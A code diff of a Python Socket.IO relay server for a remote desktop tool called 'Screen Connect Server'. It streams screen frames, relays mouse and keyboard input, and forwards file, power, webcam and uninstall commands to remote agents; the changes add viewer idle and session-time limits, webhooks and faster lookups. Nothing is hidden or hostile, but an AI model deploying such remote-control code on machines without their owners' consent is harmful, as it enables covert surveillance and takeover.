-                log.debug(f"frame_bin from unregistered sid={sid} — auth may be pending, dropping frame")
-                return
+        if not did:
+            return
         try:
             raw = bytes(data) if not isinstance(data, (bytes, bytearray)) else bytes(data)
         except Exception as e:
-            log.warning(f"frame_bin: could not convert data to bytes: {e}")
+            log.warning(f"frame_bin: could not convert to bytes: {e}")
             return
         if len(raw) >= 20:
             import struct as _s
@@ -1678,25 +1665,20 @@ if SOCKETIO_OK and sio:
             fc = len(_adv_gop_buf[did])
         if fc == 1:
             log.info(f"frame_bin: FIRST frame from agent {did} — ADV SOCKET streaming active!")
-        # Record stats for /api/stream-stats
         with _frame_stats_lock:
             _frame_stats[did].append((time.time(), len(raw)))
-        # FIX: update frame_count + last_frame_ts on device record so stream-stats total_frames is correct
         with _dev_lock:
             if did in _devices:
                 _devices[did]["frame_count"] = _devices[did].get("frame_count", 0) + 1
                 _devices[did]["last_frame_ts"] = utcnow()
-        # Fan out to BOTH the advanced-monitor viewer room AND the main-socket view room
         sio.emit("frame_bin", raw, room=f"adv_viewers_{did}")
         sio.emit("frame_bin", raw, room=f"view:{did}")
 
     @sio.on("frame_bin_relay")
     def on_frame_bin_relay(data):
-        """Fallback: agent sends frames via main socket when adv socket unavailable.
-        Receives JSON with device_id + data (list of ints or b64 string), fans out to viewers."""
+        """Fallback: main-socket frame relay when adv socket unavailable."""
         try:
-            did      = data.get("device_id", "")
-            # FIX: Accept base64-encoded frames (faster than list of ints)
+            did = data.get("device_id", "")
             if data.get("b64"):
                 import base64 as _b64
                 raw = _b64.b64decode(data["b64"])
@@ -1723,15 +1705,12 @@ if SOCKETIO_OK and sio:
                 fc = len(_adv_gop_buf[did])
             if fc == 1:
                 log.info(f"frame_bin_relay: FIRST frame from {did} via MAIN SOCKET fallback")
-            # Record stats for /api/stream-stats
             with _frame_stats_lock:
                 _frame_stats[did].append((time.time(), len(raw)))
-            # FIX: update frame_count on device record
             with _dev_lock:
                 if did in _devices:
                     _devices[did]["frame_count"] = _devices[did].get("frame_count", 0) + 1
                     _devices[did]["last_frame_ts"] = utcnow()
-            # Fan out to adv monitor viewers AND live viewer room
             sio.emit("frame_bin", raw, room=f"adv_viewers_{did}")
             sio.emit("frame_bin", raw, room=f"view:{did}")
         except Exception as e:
@@ -1739,37 +1718,23 @@ if SOCKETIO_OK and sio:
 
     @sio.on("cursor_bin")
     def on_cursor_bin(data):
-        """Second-site 60Hz cursor packet — fan out to viewers."""
+        """60Hz cursor packet — O(1) lookup."""
         sid = request.sid
-        did = None
-        for d, asid in list(_adv_agent_sids.items()):
-            if asid == sid:
-                did = d
-                break
+        did = _adv_sid_to_agent.get(sid)
         if not did:
-            # Also accept from main-socket agents (fallback path)
             with _sid_lock:
                 did = _sid_to_device.get(sid)
         if not did:
             return
         raw = bytes(data)
         _adv_cursor_latest[did] = raw
-        # Fan out to BOTH rooms — adv-monitor viewers and main-socket viewers
         sio.emit("cursor_bin", raw, room=f"adv_viewers_{did}")
         sio.emit("cursor_bin", raw, room=f"view:{did}")
-        # Update cursor latest for GOP catch-up on new viewer join
-        _adv_cursor_latest[did] = raw
 
     @sio.on("agent_info")
     def on_agent_info_adv(data):
-        """Second-site agent_info — update hostname/os."""
         sid = request.sid
-        # Check adv socket first, then main socket
-        did = None
-        for d, asid in list(_adv_agent_sids.items()):
-            if asid == sid:
-                did = d
-                break
+        did = _adv_sid_to_agent.get(sid)
         if not did:
             with _sid_lock:
                 did = _sid_to_device.get(sid)
@@ -1781,26 +1746,24 @@ if SOCKETIO_OK and sio:
 
     @sio.on("agent_pong")
     def on_agent_pong_adv(data):
-        """Second-site latency pong."""
         sid = request.sid
-        for d, asid in _adv_agent_sids.items():
-            if asid == sid:
-                rtt = (time.time() - data.get("ts", time.time())) * 1000
-                with _dev_lock:
-                    if d in _devices:
-                        _devices[d]["rtt_ms"] = round(rtt, 1)
-                break
+        did = _adv_sid_to_agent.get(sid)
+        if did:
+            rtt = (time.time() - data.get("ts", time.time())) * 1000
+            with _dev_lock:
+                if did in _devices:
+                    _devices[did]["rtt_ms"] = round(rtt, 1)
 
     @sio.on("input_event")
     def on_input_event(data):
-        """Second-site input_event from viewer → relay to agent.
-        FIXED: Also supports device_id field so main-dashboard socket works.
+        """
+        Viewer → agent input relay.
+        Also updates the viewer's idle timer for enterprise idle-timeout enforcement.
         """
         sid    = request.sid
-        # Try adv viewer rooms first (iframe socket)
+        _touch_viewer_activity(sid)  # ← reset idle timer on every input
         did    = _adv_viewer_rooms.get(sid)
         if not did:
-            # Fall back: main dashboard socket passes device_id explicitly
             did = data.get("device_id", "")
             if not did:
                 return
@@ -1808,11 +1771,10 @@ if SOCKETIO_OK and sio:
         if agent_sid:
             sio.emit("input_event", data, room=agent_sid)
         else:
-            # Fall back to request_action for agents not using advanced monitor
             with _dev_lock:
                 dev = _devices.get(did)
             if dev:
-                evt  = data.get("type", "")
+                evt = data.get("type", "")
                 if evt == "mouse_move":
                     sio.emit("request_action", {"tab": "mouse_move", **data}, room=did)
                 elif evt in ("mouse_click", "mouse_dblclick"):
@@ -1857,9 +1819,7 @@ if SOCKETIO_OK and sio:
 
     @sio.on("webrtc_connected")
     def on_webrtc_connected(data):
-        log.info(f"Advanced Monitor WebRTC DataChannel active: viewer={request.sid}")
-
-    # ── old screen_data kept as dead no-op so nothing crashes on reconnect ────
+        log.info(f"WebRTC DataChannel active: viewer={request.sid}")
 
     @sio.on("screenshot_result")
     def on_screenshot_result(data):
@@ -1869,7 +1829,6 @@ if SOCKETIO_OK and sio:
             out["frame"] = out.pop("image")
         if "frame" in out and "image" not in out:
             out["image"] = out["frame"]
-        # Route only to viewers of this device
         sio.emit("screenshot", out, room=f"view:{did}")
         sio.emit("screenshot_result", out, room=f"view:{did}")
 
@@ -1882,10 +1841,8 @@ if SOCKETIO_OK and sio:
     @sio.on("cursor_event")
     def on_cursor(data):
         did = data.get("device_id", "")
-        # Cursor events ONLY go to viewers of this specific device
         sio.emit("cursor_event", data, room=f"view:{did}")
 
-    # ── System stats — device-isolated ───────────────────────────────────────
     @sio.on("system_stats_report")
     def _r_system(data):
         did = data.get("device_id", "")
@@ -1916,14 +1873,8 @@ if SOCKETIO_OK and sio:
 
     @sio.on("file_list_result")
     def _r_flist(data):
-        """
-        FIXED: File list results go to the requesting dashboard SID (not all dashboards).
-        This prevents machine A seeing machine B's file system.
-        """
         did = data.get("device_id", "")
-        # Find which dashboard requested this — route to view room
         sio.emit("file_list_result", data, room=f"view:{did}")
-        # Also send to all dashboards for backwards compat (they filter by device_id)
         sio.emit("file_list_result", data, room="dashboards")
 
     @sio.on("file_read_result")
@@ -2005,6 +1956,15 @@ if SOCKETIO_OK and sio:
         did = data.get("device_id", "")
         sio.emit("stream_stats", data, room=f"view:{did}")
 
+    @sio.on("agent_alert")
+    def _r_agent_alert(data):
+        """Forward resource alerts to all dashboards."""
+        did = data.get("device_id", "")
+        sio.emit("agent_alert", data, room=f"view:{did}")
+        sio.emit("agent_alert", data, room="dashboards")
+        _audit("agent_alert", device_id=did, type=data.get("type"), value=data.get("value"))
+        _fire_webhook("agent_alert", data)
+
     # ── Dashboard → device commands ───────────────────────────────────────────
     @sio.on("dashboard_command")
     def on_cmd(data):
@@ -2038,7 +1998,6 @@ if SOCKETIO_OK and sio:
                 "mode":      data.get("mode", "video"),
                 "monitor":   data.get("monitor", 1),
             }, room=did)
-            log.info(f"Stream started: device={did} viewer={request.sid}")
         else:
             emit("command_error", {"error": f"Device '{did}' not connected."})
 
@@ -2085,17 +2044,13 @@ if SOCKETIO_OK and sio:
                 "device_id": did,
             }, room=did)
 
-    # ── Mouse / Keyboard / Scroll — handled by input_event in Advanced Monitor ─
     @sio.on("mouse_event")
     def on_mouse(data):
-        """Route mouse event — main dashboard uses this for remote control."""
         did = data.get("device_id", "")
-        if not did:
-            return
-        # Try advanced monitor path first
+        if not did: return
+        _touch_viewer_activity(request.sid)
         agent_sid = _adv_agent_sids.get(did)
         if agent_sid:
-            # Convert to input_event format
             evt = {
                 "device_id": did,
                 "type": "mouse_click" if data.get("action") in ("down","up","click") else "mouse_move",
@@ -2113,20 +2068,15 @@ if SOCKETIO_OK and sio:
 
     @sio.on("scroll_event")
     def on_scroll(data):
-        """Route scroll event."""
         did = data.get("device_id", "")
-        if not did:
-            return
+        if not did: return
+        _touch_viewer_activity(request.sid)
         agent_sid = _adv_agent_sids.get(did)
         if agent_sid:
-            evt = {
-                "device_id": did,
-                "type": "mouse_scroll",
-                "x": data.get("x", 0),
-                "y": data.get("y", 0),
-                "delta": data.get("delta", 3),
-            }
-            sio.emit("input_event", evt, room=agent_sid)
+            sio.emit("input_event", {
+                "device_id": did, "type": "mouse_scroll",
+                "x": data.get("x", 0), "y": data.get("y", 0), "delta": data.get("delta", 3),
+            }, room=agent_sid)
         else:
             with _dev_lock:
                 dev = _devices.get(did)
@@ -2136,6 +2086,7 @@ if SOCKETIO_OK and sio:
     @sio.on("key_event")
     def on_key(data):
         did = data.get("device_id", "")
+        _touch_viewer_activity(request.sid)
         with _dev_lock:
             dev = _devices.get(did)
         if dev:
@@ -2276,10 +2227,8 @@ if SOCKETIO_OK and sio:
             dev = _devices.get(did)
         if dev:
             sio.emit("request_action", {
-                "tab":     "file_upload",
-                "path":    data.get("path", ""),
-                "content": data.get("content", ""),
-                "device_id": did,
+                "tab": "file_upload", "path": data.get("path", ""),
+                "content": data.get("content", ""), "device_id": did,
             }, room=did)
 
     @sio.on("request_drives")
@@ -2315,7 +2264,6 @@ if SOCKETIO_OK and sio:
         if dev:
             sio.emit("request_action", {"tab": command, "device_id": did}, room=did)
             _audit("power_command", device_id=did, command=command)
-            log.info(f"Power command '{command}' → {did}")
 
     @sio.on("uninstall_agent")
     def on_uninstall(data):
@@ -2342,13 +2290,22 @@ if SOCKETIO_OK and sio:
             sio.emit("request_action", {"tab": "webcam_list", "device_id": did}, room=did)
 
     # ══════════════════════════════════════════════════════════════════════════
-    #  Watchdog — marks devices offline if heartbeat is silent
+    #  Watchdog — heartbeat timeout + viewer idle/duration enforcement
     # ══════════════════════════════════════════════════════════════════════════
     def _watchdog_loop():
+        """
+        Runs every 15s. Enforces three enterprise policies:
+        1. Heartbeat timeout — mark device offline if silent
+        2. Viewer idle timeout — kick idle viewers (VIEWER_IDLE_TIMEOUT)
+        3. Max session duration — kick viewers that exceed MAX_SESSION_DURATION
+        """
         while True:
             try:
                 time.sleep(15)
-                now = datetime.datetime.utcnow()
+                now_dt = datetime.datetime.utcnow()
+                now_mono = time.monotonic()
+
+                # ── Policy 1: Heartbeat timeout ───────────────────────────
                 stale = []
                 with _dev_lock:
                     for did, dev in list(_devices.items()):
@@ -2356,7 +2313,7 @@ if SOCKETIO_OK and sio:
                         if lb:
                             try:
                                 last = datetime.datetime.fromisoformat(lb.replace("Z", ""))
-                                if (now - last).total_seconds() > HEARTBEAT_TIMEOUT:
+                                if (now_dt - last).total_seconds() > HEARTBEAT_TIMEOUT:
                                     stale.append((did, dev.get("label", did), dev.get("sid", "")))
                             except Exception:
                                 pass
@@ -2365,18 +2322,53 @@ if SOCKETIO_OK and sio:
                         log.warning(f"Watchdog: device silent — marking offline: {label} ({did})")
 
                 for did, label, agent_sid in stale:
+                    _notify_viewers_reconnecting(did)
                     db_update(did, {"status": "offline", "disconnected_at": utcnow()})
                     _audit("watchdog_offline", device_id=did, label=label)
                     if agent_sid:
                         with _sid_lock:
                             _sid_to_device.pop(agent_sid, None)
+                    with _adv_gop_lock:
+                        _adv_gop_buf.pop(did, None)
                     sio.emit("agent_offline",  {"device_id": did, "label": label, "ts": utcnow()})
                     sio.emit("device_offline", {"device_id": did, "label": label, "ts": utcnow()})
+                    _fire_webhook("watchdog_offline", {"device_id": did, "label": label})
                 if stale:
                     broadcast_device_update()
+
+                # ── Policy 2 & 3: Viewer idle / max duration enforcement ──
+                if VIEWER_IDLE_TIMEOUT <= 0 and MAX_SESSION_DURATION <= 0:
+                    continue  # both disabled — nothing to do
+
+                to_kick: list = []  # list of (sid, reason)
+                with _viewer_activity_lock:
+                    for vsid, start in list(_viewer_session_start.items()):
+                        # Idle timeout
+                        if VIEWER_IDLE_TIMEOUT > 0:
+                            last_input = _viewer_last_activity.get(vsid, start)
+                            idle_s = now_mono - last_input
+                            if idle_s >= VIEWER_IDLE_TIMEOUT:
+                                to_kick.append((vsid, f"Idle timeout ({int(idle_s)}s)"))
+                                continue
+                        # Max session duration
+                        if MAX_SESSION_DURATION > 0:
+                            duration_s = now_mono - start
+                            if duration_s >= MAX_SESSION_DURATION:
+                                to_kick.append((vsid, f"Session duration limit ({int(duration_s)}s)"))
+
+                for vsid, reason in to_kick:
+                    log.info(f"Watchdog: kicking viewer {vsid}: {reason}")
+                    try:
+                        sio.emit("kicked", {"reason": reason, "ts": utcnow()}, room=vsid)
+                        sio.disconnect(vsid)
+                        _cleanup_viewer(vsid)
+                        _audit("viewer_kicked_by_policy", viewer_sid=vsid, reason=reason)
+                    except Exception as e:
+                        log.debug(f"Watchdog kick error for {vsid}: {e}")
+
             except Exception as exc:
                 _report_crash("_watchdog_loop", exc)
-                time.sleep(5)  # brief pause before restarting iteration
+                time.sleep(5)
 
     sio.start_background_task(_watchdog_loop)
 
@@ -2385,7 +2377,6 @@ if SOCKETIO_OK and sio:
     # ══════════════════════════════════════════════════════════════════════════
     def _self_ping_loop():
         if SELF_PING_INTERVAL <= 0 or not REQUESTS_OK:
-            log.info("Self-ping disabled")
             return
         threading.current_thread().name = "self-ping"
         time.sleep(90)
@@ -2410,28 +2401,18 @@ def startup():
     log.info("=" * 70)
     log.info(f"  Screen Connect Server  v{VERSION}  — ENTERPRISE EDITION")
     log.info("=" * 70)
-    local = Path(AGENT_DIR) / AGENT_FILE
-    if local.is_file():
-        log.info(f"  Agent (local):    {local}  ({local.stat().st_size:,} bytes)")
-    else:
-        log.info(f"  Agent (local):    not found — using GitHub Releases")
-    log.info(f"  Agent (github):   {AGENT_STORAGE_URL}")
-    log.info(f"  Supabase:         {SUPABASE_URL[:55]}")
-    log.info(f"  SocketIO:         {'yes — gevent' if SOCKETIO_OK else 'NO'}")
-    log.info(f"  Port:             {PORT}")
-    log.info(f"  Heartbeat ttl:    {HEARTBEAT_TIMEOUT}s")
-    log.info(f"  Self-ping:        every {SELF_PING_INTERVAL}s")
-    log.info(f"  WS keep-alive:    ping=20s / timeout=60s")
-    log.info(f"  Max buffer:       512 MB")
-    log.info(f"  Stream relay:     ISOLATED — per-device view rooms")
-    log.info(f"  Multi-machine:    FIXED — no cross-machine frame leaks")
-    log.info(f"  Rate limit:       {_RATE_LIMIT_RPM} req/min per IP")
-    log.info(f"  Log dir:          {_LOG_DIR}")
-    log.info(f"  Crash dir:        {_CRASH_DIR}")
-    log.info(f"  Security headers: X-Content-Type-Options, X-Frame-Options, X-XSS")
-    log.info(f"  Audit log:        GET /api/audit-log  (admin key required)")
-    log.info(f"  Server stats:     GET /api/server-stats  (admin key required)")
-    log.info(f"  Device delete:    DELETE /api/device/<id>  (admin key required)")
+    log.info(f"  Port:               {PORT}")
+    log.info(f"  Heartbeat ttl:      {HEARTBEAT_TIMEOUT}s")
+    log.info(f"  Agent exclusive:    {AGENT_EXCLUSIVE}")
+    log.info(f"  Max viewers/device: {MAX_VIEWERS_PER_DEVICE or 'unlimited'}")
+    log.info(f"  Viewer idle kick:   {VIEWER_IDLE_TIMEOUT or 'disabled'}s")
+    log.info(f"  Max session dur:    {MAX_SESSION_DURATION or 'unlimited'}s")
+    log.info(f"  Rate limit:         {_RATE_LIMIT_RPM} req/min per IP (all routes)")
+    log.info(f"  Webhook:            {'enabled → ' + WEBHOOK_URL[:40] if WEBHOOK_URL else 'disabled'}")
+    log.info(f"  Stream relay:       ISOLATED — per-device view rooms")
+    log.info(f"  Session handoff:    ENABLED — viewers auto-resume on agent reconnect")
+    log.info(f"  Viewer kick API:    POST /api/viewer/<sid>/kick  (admin key required)")
+    log.info(f"  Live sessions API:  GET  /api/sessions/live      (admin key required)")
     log.info("=" * 70)
     log.info("  RENDER start:")
     log.info("    gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \\")
